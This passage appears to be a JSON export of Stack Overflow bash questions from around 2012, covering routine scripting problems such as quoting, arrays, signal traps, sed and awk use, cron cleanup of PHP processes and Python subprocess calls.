rvm --version</p>\n\n<p>rvm 1.16.8 (master) by Wayne E. Seguin , Michal Papis  [https://rvm.io/]\n</code></p>\n\n<p>I have put <code>[[ -s \"$HOME/.rvm/scripts/rvm\" ]] &amp;&amp; source \"$HOME/.rvm/scripts/rvm\" # This loads RVM into a shell session.</code> at the bottom of the <strong>.bashrc_profile</strong>. </p>\n\n<p>When I open the new Terminal window, I have done <code>rvm default</code> every time to reset from system ruby to rvm installed ruby. </p>\n\n<p>I have done 3 hours research and read more than 20 different blogs about this issue. And I still do not have a solution for this problem. </p>\n"},{"tags":["bash","text","script","colors","sed"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":91,"score":3,"question_id":12771026,"title":"Bash script to print a text file in color","body":"<p>I have a text file with three paragraphs. I want to display the different paragraphs in different colors using bash script commands. Paragraph 1 in red, paragraph 2 in blue and paragraph 3 in cyan. </p>\n\n<p>I managed to display lines in color using commands like </p>\n\n<pre><code>echo -e '\\E[32;47m Green.'; tput sgr0\n</code></pre>\n\n<p>However, I want to parse my file and change colors when there is a new paragraph. I would appreciate for some hints. </p>\n"},{"tags":["linux","bash","profiling","iostat"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":68,"score":1,"question_id":12772088,"title":"Why read per second (r/s) in linux command (iostat) all the time is zero?","body":"<p>I run a java code that produces a lot of read and write from/to a text file. The program source is very simple and in a loop I write 2000 lines in a test file and then I read them again just to generate a lot of read and write to the disk. But when program is running I <strong>monitor the disk</strong> by \"iostat -d -x 1\" I found that <strong>there is no change in read in second \"r/s\" but \"w/s\" increased as I expected!!!</strong> \nThis is a sample output of iostat command:</p>\n\n<pre><code>Device: rrqm/s wrqm/s  r/s   w/s    rsec/s wsec/s   avgrq-sz avgqu-sz await svctm  %util\nsda     0.00   913.00  0.00  82.00  0.00   7872.00   96.00    0.58    7.09   7.11  58.30\n\nDevice: rrqm/s wrqm/s  r/s   w/s   rsec/s  wsec/s  avgrq-sz  avgqu-sz  await  svctm  %util\nsda     0.00   869.00  0.00  79.00  0.00   7584.00    96.00   0.57    7.11   7.18  56.70\n\nDevice: rrqm/s wrqm/s  r/s   w/s   rsec/s  wsec/s  avgrq-sz avgqu-sz   await  svctm  %util\nsda     0.00   847.00  0.00  77.00  0.00   7392.00   96.00   0.57      7.42   7.43  57.20\n\nDevice: rrqm/s wrqm/s  r/s   w/s   rsec/s  wsec/s   avgrq-sz avgqu-sz  await  svctm  %util\nsda     0.00  1221.00  0.00  113.00  0.00  10760.00  95.22    0.84     7.47   7.32  82.70\n</code></pre>\n\n<p>As it is shown, all \"r/s\" are zero! but in Java program I read as much as I write in the file?! When I run the Java code, number of write per second increases, but there is no change in \" r/s\" !!\nHere is java code that I run when monitoring disk :</p>\n\n<pre><code>import java.io.*;\n\npublic class Test {\n\n    public static void main(String [] args) throws IOException{\n\n    String fileName = \"/scratch/dump_file.txt\";\n    File f = new File(fileName);\n    // Attempt to delete it\n    boolean success = f.delete();\n    int j=0;\n    while(j&lt;20000)\n    {\n        ++j;\n        Writer output = null;\n        String text = \"A test content\";\n        File file = new File(fileName);\n        output = new BufferedWriter(new FileWriter(file));\n\n        int i=1;\n        while(i&lt;2000)\n        {\n            //Here we start writing 2000 lines into file line by line\n            output.write(\"j===\"+Integer.toString(j)+text+Integer.toString(i)+\"\\n\");\n            ++i;\n        }\n        output.close();\n        System.out.println(\"Your file has been written\");  \n\n        String line = null;\n        try {\n            // FileReader reads text files in the default encoding.\n            FileReader fileReader = new FileReader(fileName);\n            BufferedReader bufferedReader = \n            new BufferedReader(fileReader);\n            i=1;\n            while((line = bufferedReader.readLine()) != null) {\n                //Here we start reading from file line by line and show the result on screen\n                ++i;\n                System.out.println(line);\n            }   \n            // Always close file\n            bufferedReader.close();         \n        }\n        catch(FileNotFoundException ex) {\n            System.out.println(\n                \"Unable to open file '\" + \n                fileName + \"'\");                \n        }\n        catch(IOException ex) {\n            System.out.println(\n                \"Error reading file '\" \n                + fileName + \"'\");                  \n            // Or we could just do this: \n            // ex.printStackTrace();\n        }\n    }\n}\n}\n</code></pre>\n"},{"tags":["python","bash","mechanize"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":101,"score":-1,"question_id":12759216,"title":"Downloading web content from bash/curl to python","body":"<p>I wrote a bash script to download content of some webpage. To make it work I need to catch a cookie, then send some special data request and then i am able to get to proper link to download its content.\nMy script look like this:</p>\n\n<pre><code>#!/bin/bash  \nfor ((i=1;i&lt;=$NB;++i)); do  \ncookie=`curl -I \"http://example.com/index.php\" | grep Set-Cookie: | awk '{print $2}' |         cut -d ';' -f 1\\`  # cath a cookie  \ncurl -b $cookie --data \"a_piece_of_data\" \"http://example.com/index.php\"  \ncurl -b $cookie \"http://example.com/proper_link_$i\" &amp;&gt; $i.html  \nsleep 3  \ndone\n</code></pre>\n\n<p>As i need to parse it later on to get rid of all html/xhtml tags ( just extract pure text ) and then convert it to XML i find out Python and its lib's will be just perfect to do that.<br>So I ask you for hints how to rewrite my script to python?<br>\nHere is what i come up with so far, but its still is far away from my bash example :</p>\n\n<pre><code>import mechanize\nimport urllib2\nimport BeautifulSoup\nimport lxml\n\nrequest = mechanize.Request(\"http://example.com/index.php\")\nresponse = mechanize.urlopen(request)\ncj = mechanize.CookieJar()\ncj.extract_cookies(response, request)\nprint cj\n</code></pre>\n\n<p>Any help/hints appreciated.</p>\n"},{"tags":["bash","if-statement"],"answer_count":1,"favorite_count":2,"up_vote_count":2,"down_vote_count":0,"view_count":73,"score":2,"question_id":12765340,"title":"Difference in Bash between IF statements with parenthesis and square brackets","body":"<p>While learning a bit about bash I come to see four types of ways of working with IF statemens:</p>\n\n<ul>\n<li>Single Parenthesis - ( ... )</li>\n<li>Double Parenthesis - (( ... ))</li>\n<li>Single Square Bracket - [ ... ]</li>\n<li>Double Square Brackets - [[ ... ]]</li>\n</ul>\n\n<p>What is the difference between Parenthesis and Square Brackets in bash.</p>\n"},{"tags":["bash","init.d","sysv"],"answer_count":0,"favorite_count":2,"up_vote_count":3,"down_vote_count":0,"view_count":79,"score":3,"question_id":12768419,"title":"Puppet init script doesn't create the pid file?","body":"<ul>\n<li>CentOS release 5.4 (Final)</li>\n<li><code>puppet-server-2.7.19-1.el5</code> is installed from the puppetlabs repo.</li>\n</ul>\n\n<p><code>puppetmaster</code> is started successfull, but it doesn't create the pid file. It is the reason for <code>[ FAILED ]</code> message when stopping:</p>\n\n<pre><code>/etc/init.d/puppetmaster stop\nStopping puppetmaster:                                     [FAILED]\n</code></pre>\n\n<p>The init script: <a href=\"http://fpaste.org/nsfI/\" rel=\"nofollow\">http://fpaste.org/nsfI/</a></p>\n\n<p>The <code>/etc/rc.d/init.d/functions</code> library: <a href=\"http://fpaste.org/ox5Q/\" rel=\"nofollow\">http://fpaste.org/ox5Q/</a></p>\n\n<p>And this is what I get when running in the debug mode: <a href=\"http://fpaste.org/DkoS/\" rel=\"nofollow\">http://fpaste.org/DkoS/</a></p>\n\n<p>I know the way to <code>echo</code> the pid to a file manually after starting, but why doesn't <code>daemon</code> function's <code>--pidfile</code> work?</p>\n\n<p><code>daemon $PUPPETMASTER $PUPPETMASTER_OPTS --masterport=${PUPPETMASTER_PORTS[$i]} --pidfile=/var/run/puppet/puppetmaster.${PUPPETMASTER_PORTS[$i]}.pid</code></p>\n\n<p>Sure, Puppet master is running as <code>puppet</code> user:</p>\n\n<pre><code>ps -ef | grep [p]uppet\npuppet   23418     1  0 18:13 ?        00:00:00 /usr/bin/ruby /usr/sbin/puppetmasterd\n</code></pre>\n\n<p>and the owner of <code>/var/run/puppet/</code> folder is <code>puppet</code>:</p>\n\n<pre><code># ls -ld /var/run/puppet/\ndrwxr-xr-x 2 puppet puppet 4096 Sep 17 18:46 /var/run/puppet/\n</code></pre>\n"},{"tags":["bash"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":33,"score":1,"question_id":12768799,"title":"Bash script - working with long filename","body":"<p>Converted all my CDs into flac (for storage) but made the mistake of using a long filename (Artist Name- Album Name - Song Title). </p>\n\n<p>Sample filename: \n<strong>Jennifer Warnes - Famous Blue Raincoat - Ain't No Cure For Love.flac</strong></p>\n\n<p>Wanted to convert all the flac to mp3 (for mp3 player) using the following bash script. But first have to convert them to wav (before converting to mp3)</p>\n\n<p>In bash ran :  </p>\n\n<pre><code>for i in *.flac; do\n  flac -d $i;\ndone\n</code></pre>\n\n<p>This simple script works on filename like <strong>famous_blue_raincoat.flac</strong></p>\n\n<p>However, due to space between the letters (and probably also the '), the scripts just wouldn't work on filenames like: \n<strong>Jennifer Warnes - Famous Blue Raincoat - Ain't No Cure For Love.flac</strong></p>\n\n<p>Any recommendations and advise welcomed.</p>\n"},{"tags":["regex","bash"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":56,"score":1,"question_id":12768265,"title":"bash compare a string vs a list of strings","body":"<p>Suppose I have the following code in bash:</p>\n\n<pre><code>#!/bin/bash\n\nbad_fruit=( apple banana kiwi )\nfor fname in `ls`\ndo\n  # want to check if fname contains one of the bad_fruit\n  is_bad_fruit=??? # &lt;------- fix this line\n  if [ is_bad_fruit ]\n  then\n    echo \"$fname contains bad fruit in its name\"\n  else\n    echo \"$fname is ok\"\n  fi\ndone\n</code></pre>\n\n<p><strong>How do I fix is_bad_fruit so that it is true if fname contains one of the bad_fruit strings?</strong></p>\n"},{"tags":["osx","bash","shell","terminal","sftp"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":22,"score":0,"question_id":12766652,"title":"Tab Auto-Completion in Mac OS X when using sftp in terminal","body":"<p>i have been getting very frustrated lately since the <code>readline</code> functionality has been removed from MacOSX and Tab Auto-Completion doesn't work anymore. </p>\n\n<p>So i was wondering if anyone knew a good alternative to use that i could install so i can tab auto-complete files when sftp'd in.</p>\n\n<p>I heard that <a href=\"http://www.greenend.org.uk/rjk/sw/withreadline.html\" rel=\"nofollow\">with-readline</a> is a good option for this. If so, how do i get an <code>alias sftp = with-readline sftp</code> to work? </p>\n\n<p>I would like to do the same with any other option that isn't with-readline, so i don't have to assign an alias each time i set up a session. </p>\n\n<p>I am using Mac OS X 10.8(Mountain Lion) with Homebrew installed.</p>\n\n<p>Thanks in advance to anyone who can help me.</p>\n"},{"tags":["regex","linux","bash","sed","grep"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":2,"view_count":78,"score":0,"question_id":12763768,"title":"using sed in bash script","body":"<p>Using an array of line numbers acquired through a grep command, I'm trying to then increase the line number and retrieve what is on the new line number with a sed command, but I'm assuming something is wrong with my syntax (specifically the sed part because everything else works.)  </p>\n\n<p>The script reads:</p>\n\n<pre><code>#!/bin/bash\n\n\n#getting array of initial line numbers    \n\ntemp=(`egrep -o -n '\\&lt;a class\\=\\\"feed\\-video\\-title title yt\\-uix\\-contextlink  yt\\-uix\\-sessionlink  secondary\"' index.html |cut -f1 -d:`)\n\nnew=( )\n\n#looping through array, increasing the line number, and attempting to add the\n#sed result to a new array\n\nfor x in ${temp[@]}; do\n\n((x=x+5))\n\nz=sed '\"${x}\"q;d' index.html\n\nnew=( ${new[@]} $z ) \n\ndone\n\n#comparing the two arrays\n\necho ${temp[@]}\necho ${new[@]}\n</code></pre>\n"},{"tags":["arrays","bash","whitespace"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":43,"score":0,"question_id":12766408,"title":"Store strings with spaces into Arrays Bash","body":"<p>I'm trying to store a string with spaces into an array. I've used IFS=\"\" and noticed that by doing this. my array_size is 1 although I have multiple strings. Is there a way to fix this?</p>\n\n<p>the code i'm using</p>\n\n<pre><code>size=0\ndeclare -a new\nfor t in ${temp};\ndo\n  new[size++]=$t\ndone;\nfor n in ${new[@]};\ndo\n  echo $n end\ndone;\n</code></pre>\n\n<p>my output is..</p>\n\n<pre><code>my string 1\nmy string 2\nanother string 3\nanother string 3 end\n</code></pre>\n\n<p>my desired output would like something like this..</p>\n\n<pre><code> my string 1 end\n my string 2 end\n another string 3 end\n</code></pre>\n"},{"tags":["bash"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":35,"score":1,"question_id":12766406,"title":"How to get the first part of the string in bash","body":"<p>Say I have the following file names from an <code>ls</code> in a bash script:</p>\n\n<pre><code>things-hd-91-Statistics.db\nthings.things_domain_idx-hd-38-Data.db\n</code></pre>\n\n<p>In bash, how would it be able to get the first part of the string <code>'things'</code> in either case?\nBasically remove the rest of the string past the first <code>-</code> or <code>.</code></p>\n"},{"tags":["linux","bash","awk","grep","kill-process"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":74,"score":1,"question_id":12765850,"title":"bash script to kill php process older then an hour","body":"<p>I have the following:</p>\n\n<pre><code>kill -9 `ps aux | grep php | awk '$9 !~ /[0-9]:[0-9]/' | awk '{print $2}'`\n</code></pre>\n\n<p>What it does is kill process that have been left abandoned by fcgid and kills them to free RAM. I want to run this as a cron every hour but would like to kill processes older then an hour. I'm just not sure how to modified the script to do that.</p>\n"},{"tags":["bash","curl","scrape"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":68,"score":-1,"question_id":12762727,"title":"conditional website scraping with bash","body":"<p>The following script scrapes a website for movie titles</p>\n\n<pre><code>#!/bin/bash\nparse_url() {\nids=$(curl -s \"$1\" | grep -o -P '(?&lt;=list.php\\?mid=)\\d+')\nfor id in $ids\ndo \n\ntitles=$(curl -s \"http://subtitle.co.il/view.php?id=$id&amp;m=subtitles#${id#1}\" | grep -o -P '(?&lt;=style=\"direction:ltr;\" title=\")(.*?)(?=\"&gt;)')\nfor title in $titles \nif [[ \"$title\" == *720p* ]]\nthen\necho \"$title\"\nfi\ndone\ndone\necho \"done\"\n}\n</code></pre>\n\n<p>i want to echo $title only if it contains \"720p\". when i run the script it returns the following error: syntax error near unexpected token `if'  if [[ \"$title\" == <em>720p</em> ]]'\n  where did i go wrong? thanks</p>\n"},{"tags":["bash","time","format","script"],"answer_count":5,"favorite_count":2,"up_vote_count":11,"down_vote_count":0,"view_count":14763,"score":11,"question_id":3683434,"title":"Using time command in bash script","body":"<p>I'd like to use the <strong>time</strong> command in a <strong>bash script</strong> to calculate the elapsed time of the script and write that to a log file.  I only need the <strong>real time</strong>, not the user and sys.  Also need it in a decent format. e.g 00:00:00:00 (not like the standard output).  I appreciate any advice.</p>\n"},{"tags":["python","bash","shell"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":54,"score":0,"question_id":12765207,"title":"Python subprocess library: Running grep command from Python","body":"<p>I am trying to run grep command from my Python module using the subprocess library. Since, I am doing this operation on the doc file, I am using Catdoc third party library to get the content in a plan text file. I want to store the content in a file. I don't know where I am going wrong but the program fails to generate a plain text file and eventually to get the grep result. I have gone through the error log but its empty. Thanks for all the help. </p>\n\n<pre><code>def search_file(name, keyword):\n    #Extract and save the text from doc file\n    catdoc_cmd = ['catdoc', '-w' , name, '&gt;', 'testing.txt']\n    catdoc_process = subprocess.Popen(catdoc_cmd, stdout=subprocess.PIPE,stderr=subprocess.PIPE, shell=True)\n    output = catdoc_process.communicate()[0]\n    grep_cmd = []\n    #Search the keyword through the text file\n    grep_cmd.extend(['grep', '%s' %keyword , 'testing.txt'])\n    print grep_cmd\n    p = subprocess.Popen(grep_cmd,stdout=subprocess.PIPE,stderr=subprocess.PIPE, shell=True)\n    stdoutdata = p.communicate()[0]\n    print stdoutdata\n</code></pre>\n"},{"tags":["osx","bash","shell","terminal","wget"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":48,"score":0,"question_id":12764288,"title":"Not being able to \"make\" in Mac OS X 10.7","body":"<p>Hi so i am trying to install the commands <code>wget</code> and <code>with-readline</code> for use with Mac OS X's terminal. The configuration seems to work fine for both even though i am required to specify for the first one, <code>host= i686-apple</code>.</p>\n\n<p>When i get to the <code>make</code> part of the installation, the output is as follows.</p>\n\n<p><strong>For wget:</strong></p>\n\n<p><a href=\"http://i.stack.imgur.com/jQb3a.jpg\" rel=\"nofollow\">http://i.stack.imgur.com/jQb3a.jpg</a></p>\n\n<p><strong>for with-readline</strong></p>\n\n<p><a href=\"http://i.stack.imgur.com/EqnD7.jpg\" rel=\"nofollow\">http://i.stack.imgur.com/EqnD7.jpg</a></p>\n\n<p>so does anyone have any idea what's going on? </p>\n\n<p>Thanks in advance.</p>\n"},{"tags":["bash","shell","unix","scripting","osx-lion"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":49,"score":1,"question_id":12763998,"title":"IF statement does not recognize OR expression","body":"<p>I'm breaking my head, with this. I do not understand why the below IF statement is not working</p>\n\n<pre><code>renameOption=\"-rs\"\nif [[ $# -eq 4 ]]; then\nif [[ $renameOption != \"-rs\" ]] || [[ $renameOption != \"-rb\" ]]; then\n    echo -e \"\\tArgument three needs to be '-rs' or '-rb'\"\n    echo -e \"\\tNow exiting script\"\n    exit\nfi\nflag=1\necho \"Good to go\"\nfi\n</code></pre>\n\n<p>I know the syntax is right, but what I noticed is that the system does not recognize the OR <code>||</code> expression in the second IF. When using a single expression, it works fine, But I need to compare with two expressions, therefore the OR <code>||</code>.</p>\n\n<p>I'm running OSX Lion 10.7.4 </p>\n"},{"tags":["bash","sockets","debian","uwsgi"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":12761831,"title":"UWSGI specify socket location","body":"<p>I am trying to locate all my sockets logically and I am having a hard time understanding.</p>\n\n<p>Say, for example that I want them in this directory: <code>/var/run/&lt;app&gt;/</code></p>\n\n<p>I should specify uWSGI this in a command line parameter</p>\n\n<pre><code>--socket &lt;/var/run/&lt;app&gt;/&gt;\n</code></pre>\n\n<p>However in my <code>uwsgi.ini</code> I have this:</p>\n\n<pre><code>socket = 127.0.0.1:3031\n</code></pre>\n\n<p>In order to get the effect I want, should I be doing </p>\n\n<pre><code>socket = /var/run/uwsgi\n</code></pre>\n\n<p>I am just confused, because one is an IP and one is a directory.</p>\n"},{"tags":["ruby","bash"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":75,"score":2,"question_id":12759491,"title":"Call bash function in IRB","body":"<p>If I run a custom bash function under shell console:</p>\n\n<pre><code>~/w/dotfiles/ruby [g:master-] ¶ repository_root\n/Users/tian/Documents/workspace/dotfiles\n</code></pre>\n\n<p>And if I run the custom bash function under IRB:</p>\n\n<pre><code>irb(main):001:0&gt; `repository_root`\n(irb):1: command not found: repository_root\n=&gt; \"\"\n</code></pre>\n\n<p>How could I get the same result in IRB?</p>\n\n<pre><code># declare\nrepository_root () {\n    if git_is_repository ; then\n        git_show_repository_root\n    fi\n}\n</code></pre>\n"},{"tags":["bash","shell","script","command","substitution"],"answer_count":3,"favorite_count":1,"up_vote_count":8,"down_vote_count":0,"view_count":918,"score":8,"question_id":9405478,"title":"Command substitution: backticks or dollar sign / paren enclosed?","body":"<p>What's the preferred way to do command substitution in bash?</p>\n\n<p>I've always done it like this:</p>\n\n<pre><code>echo \"Hello, `whoami`!\"\n</code></pre>\n\n<p>But recently, I've often seen it written like this:</p>\n\n<pre><code>echo \"Hello, $(whoami)!\"\n</code></pre>\n\n<p>What's the preferred syntax, and why? Or are they pretty much interchangeable?</p>\n\n<p>I tend to favor the first, simply because my text editor seems to know what it is, and does syntax highlighting appropriately.</p>\n\n<p>I read <a href=\"http://tldp.org/LDP/Bash-Beginners-Guide/html/sect_03_04.html#sect_03_04_04\">here</a> that escaped characters act a bit differently in each case, but it's not clear to me which behavior is preferable, or if it just depends on the situation.</p>\n\n<p>Side question: Is it bad practice to use <em>both</em> forms in one script, for example when nesting command substitutions?</p>\n"},{"tags":["bash","variable-names"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":53,"score":2,"question_id":12756398,"title":"In Bash, it is okay for a variable and a function to have the same name?","body":"<p>I have the following code in my ~/.bashrc:</p>\n\n<pre><code>date=$(which date)\ndate() {\n  if [[ $1 == -R || $1 == --rfc-822 ]]; then\n    # Output RFC-822 compliant date string.\n    # e.g. Wed, 16 Dec 2009 15:18:11 +0100\n    $date | sed \"s/[^ ][^ ]*$/$($date +%z)/\"\n  else\n    $date \"$@\"\n  fi\n}\n</code></pre>\n\n<p>This works fine, as far as I can tell. Is there a reason to avoid having a variable and a function with the same name?</p>\n"},{"tags":["python","bash"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":84,"score":1,"question_id":12759551,"title":"python: os.spawn . cannot start bash process on background","body":"<p>Task is to execute bash script from python script and let it execute on background, even if python script will finish. I need UNIX solution and i do not care if it will be not working on Win.</p>\n\n<p>Python script :</p>\n\n<pre><code>#!/usr/bin/env python\nimport os, commands\ncommand = '/usr/bin/ssh localhost \"/home/gd/test/python/back.sh  \"   '\nprint os.spawnlp(os.P_NOWAIT,command)\nprint \"Python done\"\n</code></pre>\n\n<p>/home/gd/test/python/back.sh  :</p>\n\n<pre><code>#!/usr/bin/bash\n\n/bin/echo \"started\"\n/bin/sleep 80\n/bin/echo \"ended\"\n</code></pre>\n\n<p>The issue is, when python script starts , i see PID of spawned process printed. But there is no process on background. When i use P_WAIT  i see exit code 127 which means that command not found in the path. But i already provided all paths that already possible?\nThese scripts works perfectly with commands.getouput.  </p>\n"},{"tags":["bash","script","sh"],"answer_count":2,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":237,"score":2,"question_id":10810099,"title":"Executing echo c >sysrq-trigger on remote machine in bash","body":"<p>I am trying to do some automation in which following is the requirement :-</p>\n\n<p>\"From machine A run command \"echo c > /proc/sysrq-trigger\" on machine B so that machine B crashes and after machine B boots up (post crash) do some other things like copying files from machine b to  machine A.\"</p>\n\n<p>For this purpose i tried the following 2 methods  :-</p>\n\n<ol>\n<li><p>\"ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -l root  \"sh //proc/sysrq-trigger command>\"</p></li>\n<li><p>\"ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -l root  \"sh  echo c >/proc/sysrq-trigger >\"</p></li>\n</ol>\n\n<p>In both the cases password-less ssh is set or will provide password through expect. So password is not a problem here.The problem is the control gets stuck after executing sysrq instruction on the remote machine B. It does not come back on machine A so that i can perform any other operation on the same terminal.</p>\n\n<pre><code># ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -l root &lt;Machine B&gt; \"echo c &gt; /proc/sysrq-trigger \" \n</code></pre>\n\n<p>Warning: Permanently added 'ca-ostest212.us.oracle.com,139.185.48.212' (RSA) to the list of known hosts.\nroot@'s password:</p>\n\n<p>After providing password machine B crashes and reboots but prompt on machine A does not come back.Is there any method to solve this so that prompt comes back and next commands get executed on machine A.</p>\n\n<p>PS :- Apology for this lengthy query. Plz help. Thanks in advance.</p>\n"},{"tags":["regex","bash","return","expect"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":90,"score":0,"question_id":12341407,"title":"using expect script to find and return a value","body":"<p>I have a system that, when getting <code>show-table[0]</code>, prints <code>0|-100|111</code>.</p>\n\n<p>I want my expect script to receive <code>$row</code> as an argument and do the following:</p>\n\n<ol>\n<li><p>send <code>show-table[$row]</code></p></li>\n<li><p>return the value <code>-100</code> (100 will be good too)</p></li>\n</ol>\n\n<p>Here is what I've tried:</p>\n\n<pre><code>set row [lindex $argv 0]\n\nexpect {\n    \"&gt; \" {send \"show-table\\[$row\\]\\n\"}\n    timeout { exit 1 }\n}\n\nexpect {\n    \"\\|*\\|\" {}\n    timeout { exit 1 }\n}\n\nexit $expect_out(0,string)\n</code></pre>\n\n<p>2 problems:</p>\n\n<ol>\n<li>I didn't manage to make the script look for the argument I'm passing to it</li>\n<li>I didn't manage the make the script return only -100 or 100</li>\n</ol>\n\n<p>Any suggestion?</p>\n"},{"tags":["bash","nonblocking","trap","child-process","sigchld"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":71,"score":0,"question_id":12751547,"title":"How do I receive notification in a bash script when a specific child process terminates?","body":"<p>I wonder if anyone can help with this?</p>\n\n<p>I have a bash script. It starts a sub-process which is another gui-based application. The bash script then goes into an interactive mode getting input from the user. This interactive mode continues indefinately. I would like it to terminate when the gui-application in the sub-process exits.</p>\n\n<p>I have looked at SIGCHLD but this doesn't seem to be the answer. Here's what I've tried but I don't get a signal when the prog ends.</p>\n\n<pre><code>set -o monitor\n\n\"${prog}\" &amp;\nprog_pid=$!\n\nfunction check_pid {\n    kill -0 $1 2&gt; /dev/null\n}\n\nfunction cleanup {\n    ### does cleanup stuff here\n    exit\n}\n\n\nfunction sigchld {\n    check_pid $prog_pid\n    [[ $? == 1 ]] &amp;&amp; cleanup\n}\n\ntrap sigchld SIGCHLD\n</code></pre>\n\n<p><strong>Updated following answers.</strong> I now have this working using the suggestion from 'nosid'. I have another, related, issue now which is that the interactive process that follows is a basic menu driven process that blocks waiting for key input from the user. If the child process ends the USR1 signal is not handled until after input is received. Is there any way to force the signal to be handled immediately?</p>\n\n<p>The wait look looks like this:</p>\n\n<pre><code>stty raw                 # set the tty driver to raw mode \nmax=$1                   # maximum valid choice\nchoice=$(expr $max + 1)  # invalid choice\nwhile [[ $choice -gt $max ]]; do\n    choice=`dd if=/dev/tty bs=1 count=1 2&gt;/dev/null`\ndone\nstty sane                # restore tty\n</code></pre>\n\n<p><strong>Updated with solution</strong>. I have solved this. The trick was to use nonblocking I/O for the read. Now, with the answer from 'nosid' and my modifications, I have exactly what I want. For completeness, here is what works for me:</p>\n\n<pre><code>#!/bin/bash -bm\n{\n\"${1}\"\nkill -USR1 $$\n} &amp;\n\nfunction cleanup {\n    # cleanup stuff\n    exit\n}\n\ntrap cleanup SIGUSR1\n\nwhile true ; do\n   stty raw                 # set the tty driver to raw mode \n   max=9                    # maximum valid choice\n   while [[ $choice -gt $max || -z $choice ]]; do\n       choice=`dd iflag=nonblock if=/dev/tty bs=1 count=1 2&gt;/dev/null`\n   done\n   stty sane                # restore tty\n\n   # process choice       \n\ndone\n</code></pre>\n"},{"tags":["linux","bash","signals"],"answer_count":1,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":60,"score":3,"question_id":12753035,"title":"Sending SIGINT from keyboard to piped commands in bash","body":"<p>If in bash I run <code>a | b | c | d</code> on the command line and then press <kbd>^C</kbd>, which process gets the signal?</p>\n"},{"tags":["bash","emacs","cygwin"],"answer_count":4,"favorite_count":2,"up_vote_count":2,"down_vote_count":0,"view_count":936,"score":2,"question_id":9670209,"title":"cygwin bash does not display correctly in emacs shell","body":"<p>I'm trying cygwin with emacs.\nMy environment is Windows 7 x64, emacs-24.0.93.1, cygwin 2.769, system encoding is gbk, cygwin's coding system is default to utf-8, and emacs's coding system is default to gbk</p>\n\n<p>I use <a href=\"http://www.emacswiki.org/emacs/setup-cygwin.el\" rel=\"nofollow\">setup-cygwin</a>\nto setup cygwin with emacs.\nAnd I can launch emacs shell using cygwin bash.But I encountered two problem.\nFirst, two warnings at the beginning of bash</p>\n\n<pre><code>bash: cannot set terminal process group (-1): Inappropriate ioctl for device\nbash: no job control in this shell\n</code></pre>\n\n<p>Second, after bash response, some strange characters appeared. \n<img src=\"http://i.stack.imgur.com/sdF6E.png\" alt=\"enter image description here\"></p>\n\n<p>Does anyone know what happened?</p>\n"},{"tags":["bash","script","awk","processing-efficiency"],"answer_count":5,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":60,"score":1,"question_id":12746906,"title":"How to insert whitespace between characters of words in a specific field in a file","body":"<p>I have a file containing 100000 lines like this</p>\n\n<pre><code>1 0110100010010101\n2 1000010010111001\n3 1000011001111000\n10 1011110000111110\n123 0001000000100001\n</code></pre>\n\n<p>I would like to know how can I display efficiently just the second field by adding whitespaces between characters.</p>\n\n<pre><code>0 1 1 0 1 0 0 0 1 0 0 1 0 1 0 1\n1 0 0 0 0 1 0 0 1 0 1 1 1 0 0 1\n1 0 0 0 0 1 1 0 0 1 1 1 1 0 0 0\n1 0 1 1 1 1 0 0 0 0 1 1 1 1 1 0\n0 0 0 1 0 0 0 0 0 0 1 0 0 0 0 1\n</code></pre>\n\n<p>One solution would be to get the second column with awk and then add the whitespaces using sed. But as the file is too long I would like to avoid using pipes. Then I'm wondering if I can do that by just using awk.</p>\n\n<p>Thanks in advance</p>\n"},{"tags":["bash","shell","script","cygwin"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":134,"score":0,"question_id":12754097,"title":"Shell script syntax error: unexpected end of line","body":"<p>I wrote a simple shell script to check for the existence of a xml file and if it exists, then rename an old xml file to be backup and then move the new xml file to where the old xml file was stored.</p>\n\n<pre><code>#!/bin/sh    \n\noldFile=\"/Documents/sampleFolder/sampleFile.xml\"\nnewFile=\"/Documents/sampleFile.xml\"\nbackupFileName=\"/Documents/sampleFolder/sampleFile2.backup\"\noldFileLocation=\"/Documents/sampleFolder\"\n\nif [ -f \"$newFile\" ] ; then\n    echo \"File found\"\n    #Rename old file\n    mv $oldFile $backupFileName\n    #move new file to old file's location\n    mv $newFile $oldFileLocation\nelse\n    echo \"File not found, do nothing\"\nfi   \n</code></pre>\n\n<p>However, every time I try to run the script, I get 4 command not found messages and a syntax error: unexpected end of file. Any suggestions on why I get these command not found errors or the unexpected end of file? I double checked that I closed all my double quotes, I have code highlight :)</p>\n\n<p>EDIT: \n    output from running script:</p>\n\n<pre><code>: command not found: \n: command not found: \n: command not found1: \n: command not found6: \nreplaceXML.sh: line 